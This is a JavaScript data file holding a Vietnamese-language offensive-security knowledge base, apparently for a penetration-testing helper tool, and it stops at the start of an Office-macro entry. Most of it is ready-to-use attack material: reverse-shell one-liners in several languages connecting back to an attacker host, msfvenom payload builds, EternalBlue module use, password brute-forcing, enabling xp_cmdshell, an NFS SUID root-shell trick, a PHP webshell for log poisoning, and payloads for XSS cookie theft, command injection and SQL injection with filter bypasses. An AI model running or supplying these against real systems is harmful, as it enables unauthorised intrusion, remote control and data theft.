const KNOWLEDGEDATA = [
  {
    "id": "nmap",
    "category": "Tools",
    "title": "Gợi ý các lệnh quét Nmap phổ biến",
    "content": "\n**1. Quét cơ bản:**\n   * Quét nhanh (Fast Scan): `nmap -F <target_ip>`\n   * Quét toàn bộ 65535 cổng TCP: `nmap -p- <target_ip>`\n   * Quét UDP: `nmap -sU <target_ip>` (Lưu ý: rất chậm)\n\n**2. Quét xác định phiên bản và Hệ điều hành:**\n   * Quét hung hăng (Aggressive Scan - OS, Version, Script, Traceroute): `nmap -A <target_ip>`\n   * Quét phiên bản dịch vụ: `nmap -sV <target_ip>`\n\n**3. Quét sử dụng Script Engine (NSE):**\n   * Chạy các script mặc định: `nmap -sC <target_ip>` hoặc `nmap --script=default <target_ip>`\n   * Quét tất cả các script liên quan đến SMB: `nmap --script 'smb-*' -p 139,445 <target_ip>`\n\n**4. Điều chỉnh hiệu suất và định dạng Output:**\n   * Tăng tốc độ quét: `nmap -T4 ...` (Từ T1 đến T5)\n   * Lưu kết quả ra file: `nmap ... -oN normal.txt -oG greppable.txt -oX xml_format.xml`",
    "tags": ["nmap", "scan", "recon", "tools"],
    "code_snippets": [
      { "language": "bash", "command": "nmap -F <target_ip>" },
      { "language": "bash", "command": "nmap -p- <target_ip>" },
      { "language": "bash", "command": "nmap -sU <target_ip>" },
      { "language": "bash", "command": "nmap -A <target_ip>" },
      { "language": "bash", "command": "nmap -sV <target_ip>" },
      { "language": "bash", "command": "nmap -sC <target_ip>" },
      { "language": "bash", "command": "nmap --script=default <target_ip>" },
      { "language": "bash", "command": "nmap --script 'smb-*' -p 139,445 <target_ip>" },
      { "language": "bash", "command": "nmap -T4 ..." },
      { "language": "bash", "command": "nmap ... -oN normal.txt -oG greppable.txt -oX xml_format.xml" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "reverse_shell",
    "category": "Payloads",
    "title": "Bộ sưu tập các lệnh Reverse Shell",
    "content": "\n**Listener (Máy tấn công):** `nc -nlvp <port>`\n\n**1. Bash (Linux):**\n   * `bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1`\n\n**2. Netcat:**\n   * `nc -e /bin/bash <attacker_ip> <port>`\n   * `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f`\n\n**3. Python:**\n   * `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect( (\"<attacker_ip>\",<port>) );os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`\n\n**4. PHP:**\n   * `php -r '$sock=fsockopen(\"<attacker_ip>\",<port>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'`\n\n**5. PowerShell (Windows):**\n   * `powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"`",
    "tags": ["reverse shell", "shell", "payloads", "bash", "python", "powershell"],
    "code_snippets": [
      { "language": "bash", "command": "nc -nlvp <port>" },
      { "language": "bash", "command": "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1" },
      { "language": "bash", "command": "nc -e /bin/bash <attacker_ip> <port>" },
      { "language": "bash", "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f" },
      { "language": "python", "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect( (\"<attacker_ip>\",<port>) );os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" },
      { "language": "php", "command": "php -r '$sock=fsockopen(\"<attacker_ip>\",<port>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
      { "language": "powershell", "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "msfvenom",
    "category": "Tools",
    "title": "Gợi ý các lệnh tạo payload với MSFvenom",
    "content": "\n**1. Windows Reverse Shell (EXE):**\n   * `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe -o shell.exe`\n\n**2. Linux Reverse Shell (ELF):**\n   * `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f elf -o shell.elf`\n\n**3. Web Payloads (PHP, ASPX):**\n   * PHP: `msfvenom -p php/reverse_php LHOST=<attacker_ip> LPORT=<port> -f raw -o shell.php`\n   * ASPX: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f aspx -o shell.aspx`\n\n**4. Scripting Payloads (Python, Bash):**\n   * Python: `msfvenom -p cmd/unix/reverse_python LHOST=<attacker_ip> LPORT=<port> -f raw -o shell.py`\n   * Bash: `msfvenom -p cmd/unix/reverse_bash LHOST=<attacker_ip> LPORT=<port> -f raw -o shell.sh`\n\n**5. Shellcode (cho Buffer Overflow):**\n   * `msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f python -b '\\x00' EXITFUNC=thread`",
    "tags": ["msfvenom", "payloads", "tools", "metasploit"],
    "code_snippets": [
      { "language": "bash", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe -o shell.exe" },
      { "language": "bash", "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f elf -o shell.elf" },
      { "language": "php", "command": "msfvenom -p php/reverse_php LHOST=<attacker_ip> LPORT=<port> -f raw -o shell.php" },
      { "language": "bash", "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f aspx -o shell.aspx" },
      { "language": "python", "command": "msfvenom -p cmd/unix/reverse_python LHOST=<attacker_ip> LPORT=<port> -f raw -o shell.py" },
      { "language": "bash", "command": "msfvenom -p cmd/unix/reverse_bash LHOST=<attacker_ip> LPORT=<port> -f raw -o shell.sh" },
      { "language": "bash", "command": "msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f python -b '\\x00' EXITFUNC=thread" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "metasploit",
    "category": "Tools",
    "title": "Gợi ý các lệnh Metasploit Framework (MSF) cơ bản",
    "content": "\n**1. Khởi động và Quản lý Database:**\n   * Khởi động console: `msfconsole`\n   * Kiểm tra trạng thái DB: `db_status`\n   * Tạo/Chuyển workspace: `workspace -a <tên_mới>`, `workspace <tên_đã_có>`\n\n**2. Tìm kiếm và Sử dụng Module:**\n   * Tìm module: `search <từ_khóa>` (ví dụ: `search type:exploit platform:windows smb`)\n   * Sử dụng module: `use <tên_module>` (ví dụ: `use exploit/windows/smb/ms17_010_eternalblue`)\n   * Xem thông tin module: `info`\n   * Hiển thị các tùy chọn: `show options`\n\n**3. Thiết lập và Chạy Module:**\n   * Thiết lập tùy chọn: `set <TÊN_TÙY_CHỌN> <giá_trị>` (ví dụ: `set RHOSTS 192.168.1.10`)\n   * Thiết lập payload: `set payload <tên_payload>`\n   * Chạy module: `run` hoặc `exploit`",
    "tags": ["metasploit", "msf", "tools", "exploit"],
    "code_snippets": [
      { "language": "bash", "command": "msfconsole" },
      { "language": "bash", "command": "db_status" },
      { "language": "bash", "command": "workspace -a <tên_mới>" },
      { "language": "bash", "command": "workspace <tên_đã_có>" },
      { "language": "bash", "command": "search <từ_khóa>" },
      { "language": "bash", "command": "search type:exploit platform:windows smb" },
      { "language": "bash", "command": "use <tên_module>" },
      { "language": "bash", "command": "use exploit/windows/smb/ms17_010_eternalblue" },
      { "language": "bash", "command": "info" },
      { "language": "bash", "command": "show options" },
      { "language": "bash", "command": "set <TÊN_TÙY_CHỌN> <giá_trị>" },
      { "language": "bash", "command": "set RHOSTS 192.168.1.10" },
      { "language": "bash", "command": "set payload <tên_payload>" },
      { "language": "bash", "command": "run" },
      { "language": "bash", "command": "exploit" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_21",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"21\" (FTP)",
    "content": "\n**1. Thu thập thông tin:**\n   * Kiểm tra đăng nhập ẩn danh (anonymous login): `ftp <target_ip>` (user: anonymous, pass: anonymous)\n   * Nếu đăng nhập thành công, kiểm tra các file có thể đọc/ghi: `ls -la`, `get`, `put`.\n   * Sử dụng Nmap để xác định phiên bản: `nmap -sV -p 21 <target_ip>`\n\n**2. Tấn công xác thực:**\n   * Sử dụng Hydra để brute-force: `hydra -L users.txt -P passwords.txt <target_ip> ftp`\n\n**3. Khai thác lỗ hổng đã biết:**\n   * Tìm kiếm exploit cho phiên bản cụ thể (ví dụ: vsftpd 2.3.4, ProFTPD) bằng `searchsploit`.",
    "tags": ["21", "ftp", "port", "enum", "hydra"],
    "code_snippets": [
      { "language": "bash", "command": "ftp <target_ip>" },
      { "language": "bash", "command": "ls -la" },
      { "language": "bash", "command": "get" },
      { "language": "bash", "command": "put" },
      { "language": "bash", "command": "nmap -sV -p 21 <target_ip>" },
      { "language": "bash", "command": "hydra -L users.txt -P passwords.txt <target_ip> ftp" },
      { "language": "bash", "command": "searchsploit" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_22",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"22\" (SSH)",
    "content": "\n**1. Thu thập thông tin:**\n   * Banner grabbing để lấy phiên bản OpenSSH: `nc <target_ip> 22` hoặc `nmap -sV -p 22 <target_ip>`\n\n**2. Tấn công xác thực:**\n   * Brute-force mật khẩu với Hydra: `hydra -L users.txt -P passwords.txt <target_ip> ssh`\n   * Kiểm tra sử dụng lại private key (nếu tìm thấy keys ở nơi khác).\n   * Thử các creds mặc định.",
    "tags": ["22", "ssh", "port", "enum", "hydra"],
    "code_snippets": [
      { "language": "bash", "command": "nc <target_ip> 22" },
      { "language": "bash", "command": "nmap -sV -p 22 <target_ip>" },
      { "language": "bash", "command": "hydra -L users.txt -P passwords.txt <target_ip> ssh" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_23",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"23\" (Telnet)",
    "content": "\n**CẢNH BÁO: Giao thức không mã hóa!**\n   * Bất kỳ thông tin đăng nhập nào cũng sẽ được gửi dưới dạng cleartext.\n   * Sử dụng Wireshark để bắt gói tin nếu có thể.\n\n**1. Tấn công xác thực:**\n   * Brute-force với Hydra: `hydra -L users.txt -P passwords.txt <target_ip> telnet`",
    "tags": ["23", "telnet", "port", "enum", "hydra", "cleartext"],
    "code_snippets": [
      { "language": "bash", "command": "hydra -L users.txt -P passwords.txt <target_ip> telnet" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_25",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"25\" (SMTP)",
    "content": "\n**1. Liệt kê người dùng:**\n   * Sử dụng các lệnh SMTP: `VRFY <username>` (kiểm tra user), `EXPN <list>` (liệt kê list)\n   * Sử dụng script Nmap: `nmap --script smtp-commands,smtp-enum-users -p 25 <target_ip>`\n\n**2. Open Relay:**\n   * Kiểm tra xem server có phải là một open relay để gửi email giả mạo hay không.",
    "tags": ["25", "smtp", "port", "enum", "vrfy", "expn"],
    "code_snippets": [
      { "language": "bash", "command": "VRFY <username>" },
      { "language": "bash", "command": "EXPN <list>" },
      { "language": "bash", "command": "nmap --script smtp-commands,smtp-enum-users -p 25 <target_ip>" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_53",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"53\" (DNS)",
    "content": "\n**1. Zone Transfer:**\n   * Cố gắng thực hiện một zone transfer để lấy tất cả bản ghi DNS.\n   * Lệnh: `dig axfr @<dns_server> <domain_name>`",
    "tags": ["53", "dns", "port", "enum", "zone transfer", "dig", "axfr"],
    "code_snippets": [
      { "language": "bash", "command": "dig axfr @<dns_server> <domain_name>" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_80",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"80/443\" (HTTP/HTTPS)",
    "content": "\n**1. Liệt kê thư mục và file (Directory Busting):**\n   * Sử dụng `gobuster`, `dirb`, hoặc `feroxbuster`:\n   * `gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html`\n\n**2. Quét lỗ hổng web:**\n   * Sử dụng `nikto -h http://<target_ip>` để quét các lỗ hổng phổ biến.\n\n**3. Phân tích thủ công:**\n   * Kiểm tra `robots.txt` và `sitemap.xml`.\n   * Xem mã nguồn trang (View Source) để tìm comment, links ẩn, JS files.\n   * Kiểm tra các lỗ hổng web phổ biến: LFI, RFI, SQLi, Command Injection, File Upload (xem từ khóa riêng).",
    "tags": ["80", "443", "http", "https", "web", "gobuster", "nikto"],
    "code_snippets": [
      { "language": "bash", "command": "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html" },
      { "language": "bash", "command": "nikto -h http://<target_ip>" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_161",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"161\" (SNMP)",
    "content": "\n**1. Liệt kê thông tin:**\n   * Thử các community string mặc định ('public', 'private', 'manager').\n   * Sử dụng `snmp-check`, `onesixtyone`, hoặc `snmpwalk`:\n   * `snmp-check -t <target_ip> -c public`",
    "tags": ["161", "snmp", "port", "enum", "snmp-check", "public"],
    "code_snippets": [
      { "language": "bash", "command": "snmp-check -t <target_ip> -c public" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_445",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"445\" (SMB)",
    "content": "\n**1. Liệt kê thông tin:**\n   * Sử dụng `enum4linux-ng -a <target_ip>` để liệt kê shares, users, và thông tin hệ thống.\n   * Sử dụng `smbclient -L //<target_ip>/ -N` để liệt kê share ẩn danh.\n   * Kiểm tra quyền truy cập vào share: `smbclient //<target_ip>/share_name -N`\n   * Sử dụng `crackmapexec smb <target_ip> -u '' -p '' --shares` để kiểm tra quyền đọc/ghi trên share.\n\n**2. Khai thác lỗ hổng:**\n   * **MS17-010 (EternalBlue):**\n     * Kiểm tra: `nmap -p 445 --script smb-vuln-ms17-010 <target_ip>`\n   * **MS08-067:** Một lỗ hổng kinh điển khác.\n   * **ZeroLogon (CVE-2020-1472):** Nếu là Domain Controller.",
    "tags": ["445", "smb", "port", "enum", "enum4linux", "smbclient", "cme", "ms17-010"],
    "code_snippets": [
      { "language": "bash", "command": "enum4linux-ng -a <target_ip>" },
      { "language": "bash", "command": "smbclient -L //<target_ip>/ -N" },
      { "language": "bash", "command": "smbclient //<target_ip>/share_name -N" },
      { "language": "bash", "command": "crackmapexec smb <target_ip> -u '' -p '' --shares" },
      { "language": "bash", "command": "nmap -p 445 --script smb-vuln-ms17-010 <target_ip>" }
    ],
    "related_cves": ["CVE-2020-1472"],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_1433",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"1433\" (MSSQL)",
    "content": "\n**1. Tấn công xác thực:**\n   * Brute-force tài khoản 'sa' và các tài khoản khác với Hydra.\n   * Sử dụng Metasploit module: `auxiliary/scanner/mssql/mssql_login`\n\n**2. Post-Exploitation (sau khi có creds):**\n   * Sử dụng `impacket-mssqlclient` hoặc `sqsh` để kết nối.\n   * Kiểm tra quyền để bật `xp_cmdshell` để thực thi lệnh hệ thống.\n   * `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`\n   * `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`",
    "tags": ["1433", "mssql", "port", "enum", "hydra", "xp_cmdshell"],
    "code_snippets": [
      { "language": "bash", "command": "auxiliary/scanner/mssql/mssql_login" },
      { "language": "bash", "command": "impacket-mssqlclient" },
      { "language": "sql", "command": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;" },
      { "language": "sql", "command": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_2049",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"2049\" (NFS)",
    "content": "\n**1. Liệt kê Shares:**\n   * Sử dụng `showmount -e <target_ip>` để xem các NFS share có sẵn.\n\n**2. Mounting the Share:**\n   * Tạo một thư mục local: `mkdir /mnt/nfs_share`\n   * Mount share vào thư mục: `mount -t nfs <target_ip>:/<share_path> /mnt/nfs_share -o nolock`\n\n**3. Kiểm tra Leo thang đặc quyền:**\n   * Sau khi mount, `ls -la /mnt/nfs_share` để xem quyền file.\n   * Nếu share được export với `no_root_squash`, bạn có thể tạo một file SUID trên share từ user root của máy bạn.\n     * `cp /bin/bash /mnt/nfs_share/rootshell`\n     * `chmod +s /mnt/nfs_share/rootshell`\n     * Trên máy mục tiêu, chạy `./rootshell -p` để có root shell.",
    "tags": ["2049", "nfs", "port", "enum", "mount", "no_root_squash", "privesc"],
    "code_snippets": [
      { "language": "bash", "command": "showmount -e <target_ip>" },
      { "language": "bash", "command": "mkdir /mnt/nfs_share" },
      { "language": "bash", "command": "mount -t nfs <target_ip>:/<share_path> /mnt/nfs_share -o nolock" },
      { "language": "bash", "command": "ls -la /mnt/nfs_share" },
      { "language": "bash", "command": "cp /bin/bash /mnt/nfs_share/rootshell" },
      { "language": "bash", "command": "chmod +s /mnt/nfs_share/rootshell" },
      { "language": "bash", "command": "./rootshell -p" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_3306",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"3306\" (MySQL/MariaDB)",
    "content": "\n**1. Quét và Thu thập thông tin:**\n   * `nmap -sV -p 3306 <target_ip>`\n   * `nmap --script=mysql-info,mysql-enum,mysql-vuln-cve2012-2122 <target_ip>`\n\n**2. Tấn công xác thực:**\n   * Brute-force với Hydra: `hydra -L users.txt -P passwords.txt <target_ip> mysql`\n\n**3. Sau khi truy cập:**\n   * Kiểm tra quyền đọc file: `SELECT LOAD_FILE('/etc/passwd');`\n   * Tìm kiếm cơ sở dữ liệu, mật khẩu (hashes) trong các bảng.",
    "tags": ["3306", "mysql", "mariadb", "port", "enum", "hydra"],
    "code_snippets": [
      { "language": "bash", "command": "nmap -sV -p 3306 <target_ip>" },
      { "language": "bash", "command": "nmap --script=mysql-info,mysql-enum,mysql-vuln-cve2012-2122 <target_ip>" },
      { "language": "bash", "command": "hydra -L users.txt -P passwords.txt <target_ip> mysql" },
      { "language": "sql", "command": "SELECT LOAD_FILE('/etc/passwd');" }
    ],
    "related_cves": ["CVE-2012-2122"],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_3389",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"3389\" (RDP)",
    "content": "\n**1. Tấn công xác thực:**\n   * Brute-force với Hydra hoặc Crowbar.\n   * Password spraying: Thử 1-2 mật khẩu phổ biến cho tất cả user tìm được.\n\n**2. Khai thác lỗ hổng:**\n   * **BlueKeep (CVE-2019-0708):** Lỗ hổng RCE nguy hiểm cho Windows 7/Server 2008.\n     * Kiểm tra: `nmap --script rdp-vuln-cve2019-0708 -p 3389 <target_ip>`",
    "tags": ["3389", "rdp", "port", "enum", "hydra", "bluekeep"],
    "code_snippets": [
      { "language": "bash", "command": "nmap --script rdp-vuln-cve2019-0708 -p 3389 <target_ip>" }
    ],
    "related_cves": ["CVE-2019-0708"],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "port_5985",
    "category": "Port Enumeration",
    "title": "Gợi ý tấn công cho \"5985/5986\" (WinRM)",
    "content": "\n**1. Tấn công xác thực:**\n   * Đây là cổng quản lý từ xa của Windows (thay thế cho WMI).\n   * Brute-force với `evil-winrm` hoặc Metasploit.\n   * `evil-winrm -i <target_ip> -u <user_list> -p <pass_list>`\n\n**2. Kết nối:**\n   * Nếu có creds, sử dụng `evil-winrm -i <target_ip> -u <user> -p <password>` để có một shell PowerShell.",
    "tags": ["5985", "5986", "winrm", "port", "enum", "evil-winrm"],
    "code_snippets": [
      { "language": "bash", "command": "evil-winrm -i <target_ip> -u <user_list> -p <pass_list>" },
      { "language": "bash", "command": "evil-winrm -i <target_ip> -u <user> -p <password>" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "lfi",
    "category": "Web Vulnerabilities",
    "title": "Checklist cho Local File Inclusion (LFI)",
    "content": "\n**1. Phát hiện:**\n   * Tìm các tham số như `?page=`, `?file=`, `?include=`.\n   * Thử `../../../../../../../../etc/passwd` (Linux) hoặc `../../../../../../../../boot.ini` (Windows).\n\n**2. Bypass Filters:**\n   * Null byte: `../../../../etc/passwd%00` (có thể không còn hiệu quả).\n   * Path truncation: `....//....//....//etc/passwd`.\n   * Double encoding.\n\n**3. Nâng tầm tấn công:**\n   * Đọc log files để RCE (ví dụ: Apache log poisoning): Thêm `<?php system($_GET['cmd']); ?>` vào User-Agent.\n   * Đọc `/proc/self/environ`.\n   * Sử dụng PHP wrappers: `php://filter/convert.base64-encode/resource=index.php` để đọc source code.",
    "tags": ["lfi", "web", "file inclusion", "rce", "php wrapper"],
    "code_snippets": [
      { "language": "bash", "command": "?page=" },
      { "language": "bash", "command": "?file=" },
      { "language": "bash", "command": "?include=" },
      { "language": "bash", "command": "../../../../../../../../etc/passwd" },
      { "language": "bash", "command": "../../../../../../../../boot.ini" },
      { "language": "bash", "command": "../../../../etc/passwd%00" },
      { "language": "bash", "command": "....//....//....//etc/passwd" },
      { "language": "php", "command": "<?php system($_GET['cmd']); ?>" },
      { "language": "bash", "command": "/proc/self/environ" },
      { "language": "bash", "command": "php://filter/convert.base64-encode/resource=index.php" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "directory_traversal",
    "category": "Web Vulnerabilities",
    "title": "Checklist cho Directory Traversal (Path Traversal)",
    "content": "\n**1. Phát hiện:**\n   * Tương tự LFI, tìm các tham số `?file=`, `?path=`, `?document=`.\n   * Payload cơ bản: `../../../../etc/passwd` (Linux), `../../../../boot.ini` (Windows).\n\n**2. Bypass Filters:**\n   * URL Encoding: `%2e%2e%2f` thay cho `../`.\n   * Double URL Encoding: `%252e%252e%252f`.\n   * Sử dụng đường dẫn tuyệt đối nếu có thể: `/etc/passwd`.",
    "tags": ["directory traversal", "path traversal", "web", "lfi"],
    "code_snippets": [
      { "language": "bash", "command": "?file=" },
      { "language": "bash", "command": "?path=" },
      { "language": "bash", "command": "?document=" },
      { "language": "bash", "command": "../../../../etc/passwd" },
      { "language": "bash", "command": "../../../../boot.ini" },
      { "language": "bash", "command": "%2e%2e%2f" },
      { "language": "bash", "command": "%252e%252e%252f" },
      { "language": "bash", "command": "/etc/passwd" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "xss",
    "category": "Web Vulnerabilities",
    "title": "Checklist cho Cross-Site Scripting (XSS)",
    "content": "\n**1. Phân loại:**\n   * **Reflected XSS:** Payload nằm trong URL, chỉ ảnh hưởng đến người truy cập link.\n   * **Stored XSS:** Payload được lưu trên server (ví dụ: trong comment), ảnh hưởng đến tất cả người xem.\n   * **DOM-based XSS:** Lỗ hổng nằm trong code JavaScript phía client.\n\n**2. Phát hiện:**\n   * Payload cơ bản: `<script>alert(1)</script>`.\n   * Test trên tất cả các trường input và tham số URL.\n   * Payload không cần script tag: `<img src=x onerror=alert(1)>`.\n\n**3. Nâng tầm tấn công:**\n   * Ăn cắp cookie: `document.cookie`.\n   * Session hijacking, keylogging, phishing.",
    "tags": ["xss", "cross-site scripting", "web", "reflected", "stored", "dom"],
    "code_snippets": [
      { "language": "bash", "command": "<script>alert(1)</script>" },
      { "language": "bash", "command": "<img src=x onerror=alert(1)>" },
      { "language": "bash", "command": "document.cookie" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "command_injection",
    "category": "Web Vulnerabilities",
    "title": "Checklist cho Command Injection",
    "content": "\n**1. Phát hiện:**\n   * Sử dụng các ký tự shell separator: `;`, `|`, `&`, `&&`, `||`, `\n` (newline).\n   * Ví dụ: `8.8.8.8; whoami`\n\n**2. Blind Command Injection:**\n   * Sử dụng các lệnh tạo ra độ trễ thời gian: `ping -c 10 127.0.0.1`, `sleep 10`.\n   * Chuyển hướng output ra một file có thể truy cập được: `whoami > /var/www/html/output.txt`.\n\n**3. Bypass Filters:**\n   * Sử dụng command substitution: `` `whoami` ``, `$(whoami)`.\n   * Sử dụng dấu ngoặc nhọn: `cat /etc/passw{d}`.\n   * Sử dụng biến môi trường: `cat /e't'c/p'a'sswd`.",
    "tags": ["command injection", "web", "rce", "blind"],
    "code_snippets": [
      { "language": "bash", "command": "8.8.8.8; whoami" },
      { "language": "bash", "command": "ping -c 10 127.0.0.1" },
      { "language": "bash", "command": "sleep 10" },
      { "language": "bash", "command": "whoami > /var/www/html/output.txt" },
      { "language": "bash", "command": "`whoami`" },
      { "language": "bash", "command": "$(whoami)" },
      { "language": "bash", "command": "cat /etc/passw{d}" },
      { "language": "bash", "command": "cat /e't'c/p'a'sswd" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "file_upload",
    "category": "Web Vulnerabilities",
    "title": "Checklist cho File Upload Vulnerabilities",
    "content": "\n**1. Bypass Client-Side Validation:**\n   * Luôn sử dụng Burp Suite để chặn request. Validation phía client có thể dễ dàng bị vô hiệu hóa.\n\n**2. Bypass Server-Side Extension Filters:**\n   * Thử các extension thay thế: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`.\n   * Hòa trộn chữ hoa/thường: `shell.PhP`.\n   * Sử dụng double extensions: `shell.php.jpg`.\n\n**3. Bypass Content-Type Filters:**\n   * Thay đổi `Content-Type` header trong Burp từ `application/x-php` thành `image/jpeg`.\n\n**4. Bypass Magic Byte/Number Checks:**\n   * Thêm các byte đầu file của một ảnh (ví dụ: `GIF89a;`) vào đầu file shell của bạn.",
    "tags": ["file upload", "web", "rce", "webshell", "bypass"],
    "code_snippets": [
      { "language": "bash", "command": ".php" },
      { "language": "bash", "command": ".phtml" },
      { "language": "bash", "command": "shell.PhP" },
      { "language": "bash", "command": "shell.php.jpg" },
      { "language": "bash", "command": "Content-Type" },
      { "language": "bash", "command": "image/jpeg" },
      { "language": "php", "command": "GIF89a;" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "sql_injection",
    "category": "Web Vulnerabilities",
    "title": "Checklist cho SQL Injection (SQLi)",
    "content": "\n**1. Phát hiện:**\n   * Thêm dấu nháy đơn (`'`) vào cuối URL và xem có lỗi SQL không.\n   * Thử các phép toán logic: `' OR 1=1 -- -`\n\n**2. Tự động hóa:**\n   * Sử dụng `sqlmap`: `sqlmap -u \"http://<target>/page.php?id=1\" --dbs`\n   * `sqlmap -u \"...\" --current-db -T --columns -D <db_name> -T <table_name> --dump`\n\n**3. Lấy Shell (nếu có thể):**\n   * Sử dụng `sqlmap --os-shell`.",
    "tags": ["sql injection", "sqli", "web", "sqlmap"],
    "code_snippets": [
      { "language": "sql", "command": "'" },
      { "language": "sql", "command": "' OR 1=1 -- -" },
      { "language": "bash", "command": "sqlmap -u \"http://<target>/page.php?id=1\" --dbs" },
      { "language": "bash", "command": "sqlmap -u \"...\" --current-db -T --columns -D <db_name> -T <table_name> --dump" },
      { "language": "bash", "command": "sqlmap --os-shell" }
    ],
    "related_cves": [],
    "source_file": "knowledge_base.json"
  },
  {
    "id": "office_macro",
    "category": "Payloads",
    "title": "Checklist cho tấn công Microsoft Office Macro",
